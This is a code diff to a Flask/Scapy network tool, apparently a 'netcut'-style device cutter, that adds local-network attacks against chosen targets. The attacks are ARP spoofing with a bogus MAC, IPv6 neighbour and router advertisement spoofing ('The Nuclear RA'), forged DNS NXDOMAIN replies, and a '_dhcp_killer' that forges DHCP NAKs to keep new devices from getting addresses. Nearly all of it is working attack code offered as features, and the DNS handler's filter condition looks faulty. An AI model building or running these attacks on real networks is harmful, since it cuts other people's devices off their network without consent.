@@ -6,8 +6,9 @@ import threading
 import json
 import socket
 from flask import Flask, render_template, jsonify, request
-from scapy.all import ARP, Ether, srp, sendp, conf, IP, UDP, sr1, sniff, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
+from scapy.all import ARP, Ether, srp, sendp, send, conf, IP, UDP, sr1, sniff, IPv6, ICMPv6ND_NA, ICMPv6ND_RA, ICMPv6NDOptDstLLAddr, DNS, DNSQR, DNSRR, BOOTP, DHCP
 from scapy.layers.netbios import NBNSQueryRequest, NBNSNodeStatusResponse
+from scapy.layers.dhcp import *
 from flask_cors import CORS
 
 app = Flask(__name__)
@@ -130,10 +131,20 @@ class ArpManager:
         self.global_state = False # True = Everyone Cut
         self._init_system()
         
-        # Start Sniffing Thread
+        # Start Sniffing Thread (Bandwidth)
         self.sniff_thread = threading.Thread(target=self._sniff_loop)
         self.sniff_thread.daemon = True
         self.sniff_thread.start()
+
+        # Start DNS Interceptor (Quantum Feature)
+        self.dns_thread = threading.Thread(target=self._dns_sniffer)
+        self.dns_thread.daemon = True
+        self.dns_thread.start()
+
+        # Start DHCP Interceptor (Quantum Feature)
+        self.dhcp_thread = threading.Thread(target=self._dhcp_killer)
+        self.dhcp_thread.daemon = True
+        self.dhcp_thread.start()
 
     def _init_system(self):
         self._toggle_ip_forwarding(enable=False)
@@ -252,16 +263,59 @@ class ArpManager:
             })
         return devices
 
-    def _spoof_loop(self, target_ip, target_mac):
-        pkt_target = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip)
-        pkt_gateway = Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=target_ip)
+    def _spoof_loop(self, ip, mac):
+        self._toggle_ip_forwarding(enable=False)
+        bogus_mac = "08:00:27:00:00:00" 
         
-        while self.is_running:
-            if self.global_state or (target_ip in self.active_targets and self.active_targets[target_ip]["running"]):
+        pkt_target = Ether(dst=mac)/ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=bogus_mac)
+        pkt_gateway = Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip, hwsrc=bogus_mac)
+        
+        ipv6_gw = "fe80::1"
+        pkt_v6_na = IPv6(dst="ff02::1")/ICMPv6ND_NA(tgt=ipv6_gw, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr=bogus_mac)
+        
+        # RA Attack: Tells device we are the IPv6 Router (High Priority)
+        # We broadcast this to the target to disrupt their RA table
+        pkt_v6_ra = IPv6(dst=mac)/ICMPv6ND_RA(chlim=255, M=0, O=0, routerlifetime=1800, prf='High')/ICMPv6NDOptDstLLAddr(lladdr=bogus_mac)
+
+        while self.active_targets.get(ip, {}).get("running", False):
+            try:
                 sendp(pkt_target, verbose=False)
                 sendp(pkt_gateway, verbose=False)
-            else: break
-            time.sleep(1.5)
+                sendp(pkt_v6_na, verbose=False)
+                sendp(pkt_v6_ra, verbose=False) # The Nuclear RA
+                time.sleep(0.7)
+            except:
+                break
+
+    def _dns_sniffer(self):
+        """SNIFFS for DNS queries and blocks them for active targets"""
+        def process_dns(pkt):
+            if not pkt.haslayer(DNS) or pkt[DNS].qr == 0: # Is a query
+                target_ip = pkt[IP].src
+                if target_ip in self.active_targets:
+                    # Send NXDOMAIN (Domain Not Found)
+                    resp = IP(dst=target_ip, src=pkt[IP].dst)/\
+                           UDP(dport=pkt[UDP].sport, sport=53)/\
+                           DNS(id=pkt[DNS].id, qr=1, aa=1, rcode=3, qd=pkt[DNS].qd)
+                    send(resp, verbose=False)
+
+        sniff(filter="udp port 53", prn=process_dns, store=0)
+
+    def _dhcp_killer(self):
+        """Blocks new devices from getting IP addresses"""
+        def process_dhcp(pkt):
+            if pkt.haslayer(DHCP):
+                msg_type = [x[1] for x in pkt[DHCP].options if x[0] == 'message-type'][0]
+                if msg_type in [1, 3]: # DISCOVER or REQUEST
+                    target_mac = pkt[Ether].src
+                    # Send NAK (Negative Acknowledgment)
+                    # This tells the device its requested IP is rejected
+                    nak = Ether(dst=target_mac)/IP(src=self.gateway_ip, dst="255.255.255.255")/\
+                          UDP(sport=67, dport=68)/BOOTP(op=2, yiaddr="0.0.0.0", siaddr="0.0.0.0", chaddr=pkt[BOOTP].chaddr)/\
+                          DHCP(options=[("message-type", "nak"), ("server_id", self.gateway_ip), "end"])
+                    sendp(nak, verbose=False)
+
+        sniff(filter="udp port 67 or 68", prn=process_dhcp, store=0)
 
     def toggle_attack(self, ip, mac, state):
         if state:
